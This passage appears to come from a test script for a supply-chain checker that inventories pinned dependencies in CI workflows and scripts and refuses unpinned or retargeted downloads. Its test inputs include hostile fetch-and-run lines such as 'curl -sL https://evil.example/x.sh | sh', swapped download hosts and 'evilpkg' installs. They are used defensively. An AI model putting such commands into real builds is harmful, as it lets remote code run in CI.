spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv); _inv = inv.inventory; inv.inventory = lambda f: {__import__("re").sub(r"#step:[0-9a-f]+$", "", k): v for k, v in _inv(f).items()}
got = inv.inventory({"bin/tool.sh": "go install example.org/evil@v9.9.9\ndocker run alpine:3.99 true\npip install evilpkg==1.0\ncurl -L https://github.com/evil/evil/releases/download/v1.0/x.tgz | tar xz\n",
                     "bin/install-scanner.sh": "NEWT_VERSION=9.9.9\nSCOUT_BASE=\"${SCOUT_BASE_URL:-https://github.com/docker/scout-cli/releases/download}\"\nTOOL_BASE_URL=https://evil.example/dl\n",
                     "tools/act/action.yml": "runs:\n  using: composite\n  steps:\n    - uses: evil/act@v1\n",
                     ".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - uses: ./tools/act\n      - run: pip install -r deps.txt\n"})
for k in ("gotool:example.org/evil@v9.9.9", "image:alpine:3.99@", "package:pypi/evilpkg@1.0", "tool:evil/evil/x.tgz@v1.0", "tool:newt@9.9.9", "action:evil/act@v1"):
    assert k in got, (k, sorted(got))
assert any(k.startswith("action:local:./tools/act~") and k.endswith("@(local)") for k in got), sorted(got)   # a local action: its name carries a digest of the raw spelling
assert any(k.startswith("tool:source:tool_base_url=https://evil.example/dl@") for k in got), sorted(got)
assert ("a pip requirements file not named requirements*.txt" in {k[1] for k in inv.unmeasured({".github/workflows/a.yml": "x: pip install -r deps.txt\n"})})
assert not inv.unmeasured({".github/workflows/a.yml": "x: pip install -r .github/pins/adjudicator-requirements.txt\n"})
PY
CASE="a CHANGED download source or a new local action is refused (a placeholder is never a pin)"
newcase srcswap "$(printf 'import pathlib\np = pathlib.Path(\"bin/install-scanner.sh\")\np.write_text(p.read_text() + \"TOOL_BASE_URL=https://evil.example/dl\\n\")')"
runck srcswap
check test "$rc" -eq 1; check grep -q 'not a pin' "$work/srcswap.out"

CASE="an unclosed run of expression openers in a huge script is read in linear time, a file over 1 MB is refused (not read), and a very long line cannot make the form scan quadratic"
check python3 - "$here/../supply-chain/pin-inventory.py" "$work" <<'PY'
import importlib.util, os, subprocess, sys, time
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
t = time.process_time()  # this process's CPU: in-process parsing only, so box load cannot fail it
for fn in (lambda: inv.inventory({"bin/x.sh": "echo ${{ " * 60000}), lambda: inv.unmeasured({"bin/x.sh": "curl " + "http://a " * 60000})):
    try:
        fn()
    except RuntimeError as e:
        assert "refusing to read it partially" in str(e)     # one enormous line is refused outright, quickly
assert time.process_time() - t < 3, time.process_time() - t
# a long ordinary pip install with a dependency appended after 4000 characters is REFUSED, never read as its prefix
pkgs = " ".join("pkg%03d==1.0.%d" % (i, i) for i in range(400))
try:
    inv.inventory({"bin/x.sh": "pip install " + pkgs + " evilpkg==9.9.9\n"})
except RuntimeError:
    pass
else:
    raise AssertionError("an overlong pip install was accepted")
repo = sys.argv[2] + "/bigfile"; os.makedirs(repo, exist_ok=True)
subprocess.run(["git", "init", "-q", repo], check=True)
open(repo + "/big.sh", "w").write("# x\n" * 300000)
subprocess.run(["git", "-C", repo, "add", "-A"], check=True); subprocess.run(["git", "-C", repo, "commit", "-q", "-m", "x"], check=True)
for fn in (lambda: inv.tree_scripts(repo, "HEAD"), lambda: inv.tree_scripts(repo, None)):
    try:
        fn()
    except RuntimeError as e:
        assert "too large" in str(e)
    else:
        raise AssertionError("an over-size script was read")
assert inv._strip_expressions("a ${{ x }} b ${{ y") == "a ${{expression}} b ${{expression}}"
assert inv.inventory({".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: echo ${{ " + "x" * 200 + " }}\n"}) == {}
PY

CASE="a version or image given by a SHELL VARIABLE is a placeholder item that cannot be proven (adding one is refused), and an unreadable file stops the unmeasured check with exit 2, never 'nothing found'"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv); _inv = inv.inventory; inv.inventory = lambda f: {__import__("re").sub(r"#step:[0-9a-f]+$", "", k): v for k, v in _inv(f).items()}
got = inv.inventory({"bin/x.sh": "V=1.2.3\ncurl -L https://github.com/o/r/releases/download/v${V}/t.tgz | tar xz\ndocker run --rm ghcr.io/o/i:${TAG} true\ndocker run $IMG true\npip install foo==${V}\ngo install example.org/x@$V\n"})
need = ("tool:o/r/t.tgz@v${var}", "image:(variable)@", "package:pypi/foo@${var}", "gotool:example.org/x@${var}")
for k in need:
    assert k in got, (k, sorted(got))
import importlib.util as u
spec = u.spec_from_file_location("ac", sys.argv[1].replace("pin-inventory", "pin-age-check")); ac = u.module_from_spec(spec); spec.loader.exec_module(ac)
for k in need:
    ok, why = ac.judge_item(got[k])
    assert not ok and "not a pin" in why, (k, why)
PY
newcase bigagent "$(printf 'import pathlib\npathlib.Path(\".github/agent\").mkdir(parents=True, exist_ok=True)\npathlib.Path(\".github/agent/big.sh\").write_text(\"# x\\n\" * 300000)\nf = pathlib.Path(\".github/workflows/ci.yml\")\nf.write_text(f.read_text().replace(\"      - run: |\", \"      - run: curl -sL https://evil.example/x.sh | sh\\n      - run: |\", 1))')"
runck bigagent
CASE="a hostile download added next to a 1.1 MB script under .github/agent/ is still refused (the oversize file is skipped there, never turning the scan off)"
check test "$rc" -eq 1; check grep -q 'unmeasured:.github/workflows/ci.yml' "$work/bigagent.out"

CASE="every fetching spelling is either MEASURED or REFUSED when added, never silent: docker container/image subcommands, podman/nerdctl, git clone, dnf/yum/apk/snap/conda installs, dotnet tool, helm repo add, kubectl apply from a URL, gh extension, cargo binstall, npm exec, bunx, pip download from a URL, a scheme-less wget, go install with a variable module"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv); _inv = inv.inventory; inv.inventory = lambda f: {__import__("re").sub(r"#step:[0-9a-f]+$", "", k): v for k, v in _inv(f).items()}
lines = ["docker container run --rm evil/x:latest", "docker image pull evil/x:latest", "docker --context x run evil/x:latest", "podman run evil/x:latest", "nerdctl run evil/x:latest",
         "docker build https://example.org/ctx.git", "git clone https://github.com/evil/x", "dnf install -y evilpkg", "yum install evilpkg", "apk add evilpkg", "snap install evil",
         "conda install evil", "dotnet tool install evil", "helm repo add evil https://example.org", "kubectl apply -f https://example.org/x.yaml", "gh extension install evil/x",
         "cargo binstall evil", "npm exec evil", "bunx evil", "pip download https://example.org/x.whl", "wget get.example.com/x.sh", "go install ${TOOL}@v9.9.9"]
for ln in lines:
    f = {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: " + ln + "\n"}
    items = inv.inventory(f); um = inv.unmeasured(f)
    assert items or um, ("silent: " + ln)
# a line the inventory MEASURES is not also an unmeasured form
f = {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: docker run alpine@sha256:" + "a" * 64 + " true\n"}
assert inv.inventory(f) and not inv.unmeasured(f)
PY

CASE="an unmeasured form on a line that ALSO holds a measured item is still found; a placeholder is identified by its step, so a second variable image is a NEW key and a changed step is a changed key"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
mixed = {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: npm install evil-pkg && echo busybox@sha256:" + "a" * 64 + "\n"}
assert inv.unmeasured(mixed), "the npm install on a measured line was skipped"
base = {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: docker run --rm $LOCAL_IMG make test\n"}
head = {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: docker run --rm $LOCAL_IMG make test\n      - run: docker run --rm $ATTACKER_CHOSEN_IMAGE sh -c x\n"}
b, h = inv.inventory(base), inv.inventory(head)
assert [k for k in h if k not in b], "a second variable image must be a new key"
edited = {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: docker run --rm $OTHER_IMG make test\n"}
assert [k for k in inv.inventory(edited) if k not in b], "an edited placeholder step must be a new key"
PY

CASE="every curl/wget is refused unless it is a measured release download; pip install of a quoted name or a variable is a placeholder; any requirements line that is not name==ver is refused; an installer-shaped input of ANY pinned action is a placeholder"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, re, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
wf = lambda run: {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: " + run + "\n"}
for ln in ('curl -fsSL "$URL" | sh', 'wget "$TOOL_URL"', 'curl get.evil.sh | sh', 'curl -fsSL evil.zip -o x', 'curl "${{ vars.X }}"'):
    assert inv.unmeasured(wf(ln)), ("not refused: " + ln)
assert not inv.unmeasured(wf("curl -L https://github.com/o/r/releases/download/v1.0/x.tgz -o x.tgz")), "a measured release download is not an unmeasured form"
for ln in ('pip install "evilpkg"', "pip install $DEPS", 'pip install "${{ vars.PKG }}"'):
    got = inv.inventory(wf(ln))
    assert any(re.search(r"^package:pypi/(\(variable\)|evilpkg)@\(unpinned\)", k) for k in got), (ln, sorted(got))
base = inv.inventory({".github/pins/adjudicator-requirements.txt": "requests==2.32.0 \\\n    --hash=sha256:bbbb\n"})
head = inv.inventory({".github/pins/adjudicator-requirements.txt": "requests==2.32.0 \\\n    --hash=sha256:bbbb\nevilpkg @ https://evil.example/x.whl --hash=sha256:cc\nleftpad>=1\n--extra-index-url https://evil.example/simple\nbare\n"})
new = [k for k in head if k not in base]
assert len(new) == 4 and all("(unmeasured:" in k for k in new), new
uses = {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - uses: aquasecurity/setup-trivy@" + "a" * 40 + " # v0.2.0\n        with:\n          version: v0.75.0-brand-new\n"}
assert any(k.startswith("tool:aquasecurity/setup-trivy:version@(input)") for k in inv.inventory(uses)), sorted(inv.inventory(uses))
assert not any("(input)" in k for k in inv.inventory({".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - uses: actions/setup-go@" + "a" * 40 + " # v6\n        with:\n          go-version: '1.27'\n"}))
PY

CASE="a script's placeholder is identified by its own LINE: an edit elsewhere in the script moves nothing, an edit of that line does"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
base = "echo a\ndocker run --rm $IMG make\necho b\n"
a = set(inv.inventory({"bin/x.sh": base}))
assert a and a == set(inv.inventory({"bin/x.sh": base + "echo more\n"})) == set(inv.inventory({"bin/x.sh": "echo zero\n" + base}))
assert a != set(inv.inventory({"bin/x.sh": base.replace("$IMG", "$OTHER")}))
PY

CASE="round 15: a download keeps its EXACT tag, pip options may precede install and --requirement is a requirements file, *-version-file inputs are placeholders, a placeholder's identity covers the step's and the job's env, the real scanner download syntax is read and the rest of that script is scanned"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
wf = lambda run, extra="": {".github/workflows/a.yml": "jobs:\n  j:\n" + extra + "    steps:\n      - run: " + run + "\n"}
g = inv.inventory(wf("curl -L https://github.com/o/r/releases/download/v1.2.3/x.tgz -o x.tgz"))
it = [v for v in g.values() if v.name == "o/r"][0]
assert (it.version, it.label) == ("v1.2.3", "v1.2.3")
assert inv.inventory(wf("python3 -m pip --disable-pip-version-check install evilpkg==9.9.9")).get("package:pypi/evilpkg@9.9.9")
assert inv.unmeasured(wf("pip install --requirement deps.txt")) and not inv.unmeasured(wf("pip install --requirement .github/pins/adjudicator-requirements.txt"))
uses = {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - uses: actions/setup-python@" + "a" * 40 + " # v6\n        with:\n          python-version-file: .python-version\n"}
assert any("python-version-file@(input)" in k for k in inv.inventory(uses)), sorted(inv.inventory(uses))
a = inv.inventory({".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - env:\n          IMAGE: alpine@sha256:" + "a" * 64 + "\n        run: docker run --rm \"$IMAGE\" true\n"})
b = inv.inventory({".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - env:\n          IMAGE: evil/image:latest\n        run: docker run --rm \"$IMAGE\" true\n"})
assert [k for k in b if k not in a and "(variable)" in k], "changing the variable's value (env) must change the placeholder's key"
c = inv.inventory(wf("docker run --rm \"$IMAGE\" true", "    env:\n      IMAGE: alpine@sha256:" + "a" * 64 + "\n"))
d = inv.inventory(wf("docker run --rm \"$IMAGE\" true", "    env:\n      IMAGE: evil/x:latest\n"))
assert set(c) != set(d), "a job-level env value changes the identity too"
real = inv.inventory({"bin/install-scanner.sh": 'TRIVY_BASE="${TRIVY_BASE_URL:-https://github.com/aquasecurity/trivy/releases/download}"\ncurl -fsSL https://github.com/evil/evil/releases/download/v1/x.tgz -o x\n'})
assert any(k.startswith("tool:source:") and "aquasecurity/trivy" in k for k in real) and any(v.name == "evil/evil" for v in real.values()), sorted(real)
PY

CASE="round 15 (plain forms): an expression-valued installer input, a container or services image given by an expression, and a matrix or env value feeding them are step-identified placeholders (a change to the value is a changed key); each curl/wget invocation is judged on its own"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
def wfi(env, ver="${{ env.LINT_V }}"):
    return {".github/workflows/a.yml": "env:\n  LINT_V: " + env + "\njobs:\n  j:\n    steps:\n      - uses: golangci/golangci-lint-action@" + "a" * 40 + " # v9\n        with:\n          version: " + ver + "\n"}
a, b = set(inv.inventory(wfi("v1.61.0"))), set(inv.inventory(wfi("v9.9.9")))
assert a != b and any("golangci-lint@${{expression}}" in k for k in a), (a, b)
def wfm(m):
    return {".github/workflows/a.yml": "jobs:\n  j:\n    strategy:\n      matrix:\n        py: " + m + "\n    steps:\n      - uses: actions/setup-python@" + "a" * 40 + " # v6\n        with:\n          python-version: ${{ matrix.py }}\n"}
assert set(inv.inventory(wfm("['3.12']"))) != set(inv.inventory(wfm("['3.12', '3.13-dev']")))
def wfc(m, svc="postgres:${{ matrix.pg }}"):
    return {".github/workflows/a.yml": "jobs:\n  j:\n    strategy:\n      matrix:\n        image: " + m + "\n    container: ${{ matrix.image }}\n    services:\n      db:\n        image: " + svc + "\n    steps:\n      - run: echo hi\n"}
c1 = inv.inventory(wfc("['node:20']"))
assert any(k.startswith("image:(expression)@") for k in c1) and len([k for k in c1 if k.startswith("image:(expression)")]) == 2, sorted(c1)
assert set(c1) != set(inv.inventory(wfc("['node:20', 'evil:latest']")))
um = inv.unmeasured({".github/workflows/a.yml": "x: wget https://example.com/a.tgz; curl -fsSL https://github.com/foo/bar/releases/download/v1.2.3/bar.tgz -o b\n"})
assert [k for k in um if k[1] == "a download"], "the non-release wget before a release curl must still be refused"
assert not inv.unmeasured({".github/workflows/a.yml": "x: curl -fsSL https://github.com/foo/bar/releases/download/v1.2.3/bar.tgz -o b\n"})
PY

CASE="round 15 (Codex): the exact download tag is the identity (v1.2.3 and 1.2.3 differ), an encoded-tag URL is refused not excused, requirements.in/-dev/.lock files are refused, an unversioned go install is a placeholder, an unresolved package NAME cannot pass the pin judge, installer-input placeholders carry their step identity"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import datetime, importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
spec2 = importlib.util.spec_from_file_location("ac", sys.argv[1].replace("pin-inventory", "pin-age-check")); ac = importlib.util.module_from_spec(spec2); spec2.loader.exec_module(ac)
wf = lambda run: {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: " + run + "\n"}
k1 = set(inv.inventory(wf("curl -L https://github.com/o/r/releases/download/v1.2.3/x.tgz -o x")))
k2 = set(inv.inventory(wf("curl -L https://github.com/o/r/releases/download/1.2.3/x.tgz -o x")))
assert k1 != k2
assert inv.unmeasured(wf("curl -L https://github.com/o/r/releases/download/release%2F1.2.3/x.tgz -o x")), "an encoded-tag URL must be refused"
for ln in ("pip install -r requirements.in", "pip install -r requirements-dev", "pip install --requirement requirements.lock"):
    assert inv.unmeasured(wf(ln)), ln
assert not inv.unmeasured(wf("pip install -r requirements.txt")) and not inv.unmeasured(wf("pip install -r .github/pins/adjudicator-requirements.txt"))
assert [k for k in inv.inventory(wf("go install -mod=mod github.com/securego/gosec/v2/cmd/gosec")) if "(unversioned)" in k]
it = [v for v in inv.inventory(wf('go install "$TOOL@v1.2.3"')).values() if v.kind == "gotool"][0]
ok, why = ac.judge_item(it)
assert not ok and "not a pin" in why, why
u = lambda v: {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - uses: actions/setup-python@" + "a" * 40 + " # v6\n        with:\n          python-version-file: " + v + "\n"}
assert set(inv.inventory(u(".python-version"))) != set(inv.inventory(u(".python-version-new")))
PY

CASE="a download SOURCE is an item: url=/URL=/*_BASE_URL assignments in a script and *_BASE_URL/*_URL env at any level; retargeting one (an env override, a url template line) is a changed key and is refused"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
sh = lambda ln: {"bin/install-scanner.sh": "TRIVY_VER=0.74.0\n" + ln + "\ncurl -fsSL \"$url\" -o t\n"}
a = set(inv.inventory(sh('url="${TRIVY_BASE}/v${TRIVY_VER}/trivy.tgz"'))); b = set(inv.inventory(sh('url="https://evil.example/t.tgz"')))
assert a != b and [k for k in b if k not in a and "(source)" in k], (a, b)
envwf = lambda v: {".github/workflows/a.yml": "env:\n  TRIVY_BASE_URL: " + v + "\njobs:\n  j:\n    steps:\n      - run: bin/install-scanner.sh trivy\n"}
assert set(inv.inventory(envwf("https://github.com/aquasecurity/trivy/releases/download"))) != set(inv.inventory(envwf("https://evil.example/dl")))
assert [k for k in inv.inventory(envwf("https://x")) if k.startswith("tool:source:env:trivy_base_url=")]
PY

CASE="round 16 (Codex): go install of a variable and pip3.12 install are placeholders/items; a script placeholder's identity includes the assignments of the variables it references; every URL of a downloader segment is classified by host and path; the downloaded asset name is part of the identity"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
wf = lambda run: {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: " + run + "\n"}
assert [k for k in inv.inventory(wf('go install "$TOOL"')) if "(variable)" in k]
assert inv.inventory(wf("pip3.12 install examplepkg==99.0.0")).get("package:pypi/examplepkg@99.0.0")
a = set(inv.inventory({"bin/x.sh": "TAG=v1.0.0\ndocker run ghcr.io/acme/tool:$TAG true\n"})); b = set(inv.inventory({"bin/x.sh": "TAG=v9.0.0\ndocker run ghcr.io/acme/tool:$TAG true\n"}))
assert a != b
assert inv.unmeasured(wf("curl -fLO https://github.com/cli/cli/releases/download/v2.40.0/gh.tar.gz https://downloads.example/new-tool.tar.gz"))
assert inv.unmeasured(wf("curl -fLO https://mirror.example/github.com/cli/cli/releases/download/v2.40.0/gh.tar.gz"))
assert not inv.unmeasured(wf("curl -fLO https://github.com/cli/cli/releases/download/v2.40.0/gh.tar.gz"))
x = set(inv.inventory(wf("curl -L https://github.com/o/r/releases/download/v1.2.3/old.tgz -o x"))); y = set(inv.inventory(wf("curl -L https://github.com/o/r/releases/download/v1.2.3/new.tgz -o x")))
assert x != y
PY

CASE="an option chain of a thousand tokens before pip/docker is read in milliseconds (no regex backtracking), and docker global options with values (--context x) do not hide the subcommand"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys, time
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
t = time.process_time()  # this process's CPU: in-process parsing only, so box load cannot fail it
for body in ("pip" + " -a" * 1000 + " x", "docker" + " -a" * 1000 + " x", "python3 -m pip" + " -q" * 1000 + " install evilpkg==9.9.9"):
    inv.inventory({"bin/x.sh": body + "\n"})
assert time.process_time() - t < 2, time.process_time() - t
assert inv.inventory({".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: docker --context x run evil/x:latest\n"})
PY

CASE="a hostile many-line file or a step that repeats one command hundreds of times is refused quickly (items and lines are bounded), and compound commands (cd x&&pip install y; a;pip install b) are read as separate commands"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys, time
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
t = time.process_time()  # this process's CPU: in-process parsing only, so box load cannot fail it
for files in ({"bin/x.sh": ("pip install " * 320 + "\n") * 100},
              {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: |\n" + "".join("          " + "pip install " * 320 + "\n" for _ in range(100))},
              {"bin/y.sh": "echo\n" * 30000}):
    try:
        inv.inventory(files)
    except RuntimeError:
        pass
    else:
        raise AssertionError("a hostile file was read")
assert time.process_time() - t < 5, time.process_time() - t
got = inv.inventory({"bin/x.sh": "cd x&&pip install foo==1.0\necho hi;pip install bar==2.0\n"})
assert "package:pypi/foo@1.0" in got and "package:pypi/bar@2.0" in got
PY

CASE="removing an installer action's version input leaves a (default) placeholder (refused)"
check python3 - "$here/../supply-chain/pin-inventory.py" "$work" <<'PY'
import importlib.util, sys, subprocess, os, json
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
mk = lambda w: {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - uses: golangci/golangci-lint-action@" + "a" * 40 + " # v9\n" + w}
with_v = inv.inventory(mk("        with:\n          version: v2.13.2\n")); without = inv.inventory(mk(""))
assert [k for k in without if k not in with_v and "(default)" in k], sorted(without)
assert not [k for k in with_v if "(default)" in k]
PY

CASE="phase 2 R2 fixes: version FILES are items (their content is the key), a called workflow's input defaults and a local call's with: change the identity, a changed checksum on a download's step moves it, pip global options with values do not hide install, a second (default) step is its own key"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
assert set(inv.inventory({".python-version": "3.12\n"})) != set(inv.inventory({".python-version": "3.99.9\n"}))
callee = lambda v: {".github/workflows/callee.yml": "on:\n  workflow_call:\n    inputs:\n      lint-version:\n        default: " + v + "\njobs:\n  j:\n    steps:\n      - uses: golangci/golangci-lint-action@" + "a" * 40 + " # v9\n        with:\n          version: ${{ inputs.lint-version }}\n"}
assert set(inv.inventory(callee("v2.13.2"))) != set(inv.inventory(callee("v9.99.9")))
caller = lambda v: {".github/workflows/caller.yml": "jobs:\n  c:\n    uses: ./.github/workflows/callee.yml\n    with:\n      lint-version: " + v + "\n"}
assert set(inv.inventory(caller("v2.13.2"))) != set(inv.inventory(caller("v9.99.9")))
dl = lambda sm: {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: |\n          curl -L https://github.com/o/r/releases/download/v1.2.3/tool.tgz -o tool.tgz\n          echo " + sm + "  tool.tgz | sha256sum --check\n"}
assert set(inv.inventory(dl("a" * 64))) != set(inv.inventory(dl("b" * 64)))
assert inv.inventory({"bin/x.sh": "pip --timeout 60 install evil==9.9.9\n"}).get("package:pypi/evil@9.9.9")
d2 = inv.inventory({".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - name: one\n        uses: golangci/golangci-lint-action@" + "a" * 40 + " # v9\n      - name: two\n        uses: golangci/golangci-lint-action@" + "a" * 40 + " # v9\n"})
assert len([k for k in d2 if "(default)" in k]) == 2
PY

CASE="bumping an action whose step also carries a placeholder (a checkout with fetch-tags: true, a (default) installer input) moves ONLY the action: the placeholder's identity does not contain the pin, and a boolean input is not an installer input"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
co = lambda sha: {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - uses: actions/checkout@" + sha + " # v7\n        with:\n          fetch-tags: true\n"}
a, b = inv.inventory(co("a" * 40)), inv.inventory(co("b" * 40))
assert [k for k in b if k not in a] == ["action:actions/checkout@" + "b" * 40], [k for k in b if k not in a]
assert not [k for k in a if "(input)" in k]
lint = lambda sha: {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - uses: golangci/golangci-lint-action@" + sha + " # v9\n"}
assert [k for k in inv.inventory(lint("b" * 40)) if k not in inv.inventory(lint("a" * 40))] == ["action:golangci/golangci-lint-action@" + "b" * 40]
PY

CASE="phase 2 R3 fixes: --isolated is a flag (install is not its value), a version file at any path is an item, two identical unresolved installer steps are two items, a checksum in ANY step of the job moves a download, a python/java/node SERIES (3.12, 21) is not an exact pin"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
assert inv.inventory({"bin/x.sh": "python3 -m pip --isolated install black==99.0.0\n"}).get("package:pypi/black@99.0.0")
assert set(inv.inventory({"config/.python-version": "3.12.1\n"})) != set(inv.inventory({"config/.python-version": "3.99.9\n"}))
two = lambda second: {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - uses: golangci/golangci-lint-action@" + "a" * 40 + " # v9\n      - uses: golangci/golangci-lint-action@" + "a" * 40 + " # v9\n" + second}
assert len([k for k in inv.inventory(two("")) if "(default)" in k]) == 2
sep = lambda sm: {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: curl -L https://github.com/o/r/releases/download/v1.2.3/tool.tgz -o tool.tgz\n      - run: echo " + sm + "  tool.tgz | sha256sum --check\n"}
assert set(inv.inventory(sep("a" * 64))) != set(inv.inventory(sep("b" * 64)))
spec2 = importlib.util.spec_from_file_location("ac", sys.argv[1].replace("pin-inventory", "pin-age-check")); ac = importlib.util.module_from_spec(spec2); spec2.loader.exec_module(ac)
for name, ver in (("python", "3.12"), ("java", "21"), ("node", "22")):
    assert not ac.judge_item(inv.Item("tool", name, ver))[0], name
assert ac.judge_item(inv.Item("tool", "python", "3.12.4"))[0]
PY

CASE="phase 2 R5 fixes: repeated expression-valued installer steps are numbered, a checksum FILE's content moves a download, an env source key bound to an expression never prints its name"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
two = lambda v2: {".github/workflows/a.yml": "env:\n  LINT_V: v2.14.0\njobs:\n  j:\n    steps:\n      - uses: golangci/golangci-lint-action@" + "a" * 40 + " # v9\n        with:\n          version: ${{ env.LINT_V }}\n      - uses: golangci/golangci-lint-action@" + "a" * 40 + " # v9\n        with:\n          version: " + v2 + "\n"}
assert set(inv.inventory(two("v2.13.2"))) != set(inv.inventory(two("${{ env.LINT_V }}")))
assert len([k for k in inv.inventory(two("${{ env.LINT_V }}")) if "expression" in k]) == 2
cs = lambda c: {".github/policy/gh-checksums.txt": c * 64 + "  gh.tar.gz\n"}
assert set(inv.inventory(cs("a"))) != set(inv.inventory(cs("b")))
src = inv.inventory({".github/workflows/a.yml": "jobs:\n  j:\n    env:\n      PRIVATE_DOWNLOAD_URL: ${{ secrets.PRIVATE_DOWNLOAD_URL }}\n    steps:\n      - run: echo hi\n"})
assert not any("private_download_url" in k.lower() for k in src), sorted(src)
PY

CASE="an image named localhost/... (no port) used by docker run/create with --pull=never is local to the job and is NOT an item (advisor 0203); a pull, a run without --pull=never, a container: or services: image, localhost:PORT/, localhostx/ and a mid-name localhost/ all stay items (a registry can answer for localhost; Codex #187)"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
step = lambda cmd: {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: " + cmd + "\n"}
imgs = lambda files: [k for k in inv.inventory(files) if k.startswith("image:")]
D = "@sha256:" + "a" * 64
assert not imgs(step("docker run --pull=never --rm localhost/fa-production true")), "run --pull=never of a localhost/ image is local"
assert not imgs(step("docker create --pull never localhost/fa-debug:latest")), "create --pull never too"
assert imgs(step("docker run --rm localhost/fa-production true")), "a run without --pull=never may pull"
assert imgs(step("docker pull localhost/x" + D)), "a pull downloads from a registry named localhost"
assert imgs(step("docker run --pull=always localhost/x" + D)), "--pull=always downloads"
assert imgs(step("docker run --pull=never localhost:5000/fa-production:1 true")), "localhost:PORT is a registry"
assert imgs(step("docker run --pull=never localhostx/fa-production:1 true")), "a name that only starts with localhost is not local"
assert imgs(step("docker run --pull=never registry.example/localhost/fa:1 true")), "localhost/ in the middle of a name is not local"
